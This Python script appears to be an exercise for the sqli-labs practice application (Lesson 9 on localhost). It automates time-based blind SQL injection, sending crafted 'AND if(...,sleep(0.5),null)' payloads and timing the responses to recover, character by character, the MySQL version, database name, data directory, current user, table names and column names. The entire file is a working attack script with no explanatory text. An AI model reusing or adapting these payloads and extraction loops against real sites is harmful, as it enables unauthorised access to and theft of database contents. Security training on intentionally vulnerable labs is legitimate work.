import requests



def get_time_requester(payload):
    response_text = requests.get(payload)
    return response_text.elapsed.total_seconds()



def database_name_length_finder(payload, validator):
    response = False
    i = 1
    while (response == False):
        list_payload = list(payload)
        list_payload[89] = str(i)
        payload_1 = "".join(list_payload)

        print(payload_1)
        response_time = get_time_requester(payload_1)

        if (validator <= response_time):
            response = True
            database_name_length = i
        else:
            response = False
            i = i + 1;
    return database_name_length



def database_name_finder(payload, validator):
    i = 0
    a = 32
    ascii_max = 127
    list_payload_1 = list(payload)
    database_name_list = []
    payload_database_length = "http://localhost/sqli-labs-php7-master/Less-9/?id=1' AND if((select length(database()) = 1),sleep(0.5),null) --+"

    database_name_length = database_name_length_finder(payload_database_length, validator)
    print(database_name_length)

    while (i < database_name_length):
        i = i + 1
        list_payload_2 = list_payload_1
        list_payload_2[95] = str(i)

        while (a < ascii_max):
            if (a == 32):
                list_payload_2[104] = str(a)
                payload_1 = "".join(list_payload_2)

                print(payload_1)
                response_time = get_time_requester(payload_1)
            else:
                print(payload_1)
                response_time = get_time_requester(payload_1)

            if (validator <= response_time):
                database_name_list.append(chr(a))
                a = 32
                break
            else:
                a = a + 1
                list_payload_2[104] = str(a)
                payload_1 = "".join(list_payload_2)

    database_name = "".join(database_name_list)

    return database_name



def username_length_finder(payload, validator):
    response = False
    i = 1
    while (response == False):
        list_payload = list(payload)
        list_payload[85] = str(i)
        payload_1 = "".join(list_payload)

        print(payload_1)
        response_time = get_time_requester(payload_1)

        if (validator <= response_time):
            response = True
            username_length = i
        else:
            response = False
            i = i + 1;

    return username_length



def username_finder(payload, validator):
    i = 0
    a = 32
    ascii_max = 127
    list_payload_1 = list(payload)
    database_name_list = []
    payload_username_length = "http://localhost/sqli-labs-php7-master/Less-9/?id=1' AND if((select length(user()) = 1),sleep(0.5),null) --+"

    username_length = username_length_finder(payload_username_length, validator)
    print(username_length)

    while (i < username_length):
        i = i + 1
        list_payload_2 = list_payload_1
        list_payload_2[91] = str(i)

        while (a < ascii_max):
            if (a == 32):
                list_payload_2[100] = str(a)
                payload_1 = "".join(list_payload_2)

                print(payload_1)
                response_time = get_time_requester(payload_1)
            else:
                print(payload_1)
                response_time = get_time_requester(payload_1)

            if (validator <= response_time):
                database_name_list.append(chr(a))
                a = 32
                break
            else:
                a = a + 1
                list_payload_2[100] = str(a)
                payload_1 = "".join(list_payload_2)

    username = "".join(database_name_list)

    return username



def datadir_length_finder(payload, validator):
    response = False
    i = 1
    while (response == False):
        list_payload = list(payload)
        list_payload[88] = str(i)
        payload_1 = "".join(list_payload)

        print(payload_1)
        response_time = get_time_requester(payload_1)

        if (validator <= response_time):
            response = True
            datadir_length = i
        else:
            response = False
            i = i + 1;

    return datadir_length



def datadir_finder(payload, validator):
    i = 0
    a = 32
    ascii_max = 127
    list_payload_1 = list(payload)
    database_name_list = []
    payload_datadir_length = "http://localhost/sqli-labs-php7-master/Less-9/?id=1' AND if((select length(@@datadir) = 1),sleep(0.5),null) --+"

    datadir_length = datadir_length_finder(payload_datadir_length, validator)
    print(datadir_length)

    while (i < datadir_length):
        i = i + 1
        list_payload_2 = list_payload_1
        list_payload_2[94] = str(i)

        while (a < ascii_max):
            if (a == 32):
                list_payload_2[103] = str(a)
                payload_1 = "".join(list_payload_2)

                print(payload_1)
                response_time = get_time_requester(payload_1)
            else:
                print(payload_1)
                response_time = get_time_requester(payload_1)

            if (validator <= response_time):
                database_name_list.append(chr(a))
                a = 32
                break
            else:
                a = a + 1
                list_payload_2[103] = str(a)
                payload_1 = "".join(list_payload_2)

    datadir_name = "".join(database_name_list)

    return datadir_name



def version_length_finder(payload, validator):
    response = False
    i = 1
    while (response == False):
        list_payload = list(payload)
        list_payload[88] = str(i)
        payload_1 = "".join(list_payload)

        print(payload_1)
        response_time = get_time_requester(payload_1)

        if (validator <= response_time):
            response = True
            version_length = i
        else:
            response = False
            i = i + 1;

    return version_length



def version_finder(payload, validator):
    i = 0
    a = 32
    ascii_max = 127
    list_payload_1 = list(payload)
    database_name_list = []
    payload_version_length = "http://localhost/sqli-labs-php7-master/Less-9/?id=1' AND if((select length(version()) = 1),sleep(0.5),null) --+"

    version_length = version_length_finder(payload_version_length, validator)
    print(version_length)

    while (i < version_length):
        i = i + 1
        list_payload_2 = list_payload_1
        list_payload_2[94] = str(i)

        while (a < ascii_max):
            if (a == 32):
                list_payload_2[103] = str(a)
                payload_1 = "".join(list_payload_2)

                print(payload_1)
                response_time = get_time_requester(payload_1)
            else:
                print(payload_1)
                response_time = get_time_requester(payload_1)

            if (validator <= response_time):
                database_name_list.append(chr(a))
                a = 32
                break
            else:
                a = a + 1
                list_payload_2[103] = str(a)
                payload_1 = "".join(list_payload_2)

    version_name = "".join(database_name_list)

    return version_name



def tablename_length_finder(payload, validator):
    response = False
    i = 1
    while (response == False):
        list_payload = list(payload)
        list_payload[166] = str(i)
        payload_1 = "".join(list_payload)

        print(payload_1)
        response_time = get_time_requester(payload_1)

        if (validator <= response_time):
            response = True
            tablename_length = i
        else:
            response = False
            i = i + 1;

    return tablename_length



def tablename_finder(payload, validator):
    i = 0
    a = 32
    ascii_max = 127
    list_payload_1 = list(payload)
    database_name_list = []
    payload_tablename_length = "http://localhost/sqli-labs-php7-master/Less-9/?id=1' AND if(((select length(group_concat(table_name)) from information_schema.tables where table_schema=database()) = 0),sleep(0.5),null) --+"

    tablename_length = tablename_length_finder(payload_tablename_length, validator)
    print(tablename_length)

    while (i < tablename_length):
        i = i + 1
        list_payload_2 = list_payload_1
        list_payload_2[170] = str(i)

        while (a < ascii_max):
            if (a == 32):
                list_payload_2[179] = str(a)
                payload_1 = "".join(list_payload_2)

                print(payload_1)
                response_time = get_time_requester(payload_1)
            else:
                print(payload_1)
                response_time = get_time_requester(payload_1)

            if (validator <= response_time):
                database_name_list.append(chr(a))
                a = 32
                break
            else:
                a = a + 1
                list_payload_2[179] = str(a)
                payload_1 = "".join(list_payload_2)

    table_name = "".join(database_name_list)

    return table_name



def columnname_length_finder(payload, validator):
    response = False
    i = 1
    while (response == False):
        list_payload = list(payload)
        list_payload[163] = str(i)
        payload_1 = "".join(list_payload)

        print(payload_1)
        response_time = get_time_requester(payload_1)

        if (validator <= response_time):
            response = True
            columnname_length = i
        else:
            response = False
            i = i + 1;

    return columnname_length



def columnname_finder(payload, validator):
    i = 0
    a = 32
    ascii_max = 127
    list_payload_1 = list(payload)
    database_name_list = []
    payload_columnname_length = "http://localhost/sqli-labs-php7-master/Less-9/?id=1' AND if(((select length(group_concat(column_name)) from information_schema.columns where table_name='users') = 0),sleep(0.5),null) --+"

    columnname_length = columnname_length_finder(payload_columnname_length, validator)
    print(columnname_length)

    while (i < columnname_length):
        i = i + 1
        list_payload_2 = list_payload_1
        list_payload_2[167] = str(i)

        while (a < ascii_max):
            if (a == 32):
                list_payload_2[176] = str(a)
                payload_1 = "".join(list_payload_2)

                print(payload_1)
                response_time = get_time_requester(payload_1)
            else:
                print(payload_1)
                response_time = get_time_requester(payload_1)

            if (validator <= response_time):
                database_name_list.append(chr(a))
                a = 32
                break
            else:
                a = a + 1
                list_payload_2[176] = str(a)
                payload_1 = "".join(list_payload_2)

    column_name = "".join(database_name_list)

    return column_name



def sql_injector():
    validator = 0.5
    payload_version = "http://localhost/sqli-labs-php7-master/Less-9/?id=1' AND if(((ascii(substr((select version()),1,1))) = 0),sleep(0.5),null) --+"
    payload_database = "http://localhost/sqli-labs-php7-master/Less-9/?id=1' AND if(((ascii(substr((select database()),1,1))) = 0),sleep(0.5),null) --+"
    payload_datadir = "http://localhost/sqli-labs-php7-master/Less-9/?id=1' AND if(((ascii(substr((select @@datadir,1,1))) = 0),sleep(0.5),null) --+"
    payload_username = "http://localhost/sqli-labs-php7-master/Less-9/?id=1' AND if(((ascii(substr((select user()),1,1))) = 0),sleep(0.5),null) --+"
    payload_tablename = "http://localhost/sqli-labs-php7-master/Less-9/?id=1' AND if(((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))) = 0),sleep(0.5),null) --+"
    payload_columnname = "http://localhost/sqli-labs-php7-master/Less-9/?id=1' AND if(((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users'),1,1))) = 0),sleep(0.5),null) --+"

    version_name = version_finder(payload_version, validator)
    database_name = database_name_finder(payload_database, validator)
    datadir_name = datadir_finder(payload_datadir, validator)
    user_name = username_finder(payload_username, validator)
    table_name = tablename_finder(payload_tablename, validator)
    column_name = columnname_finder(payload_columnname, validator)

    print("\n")
    print("Version: " + version_name)
    print("\n")
    print("Database_Name: " + database_name)
    print("\n")
    print("Data_directory: " + datadir_name)
    print("\n")
    print("Username: " + user_name)
    print("\n")
    print("Tables_in_Database: " + table_name)
    print("\n")
    print("Columns_in_Database: " + column_name)



sql_injector()
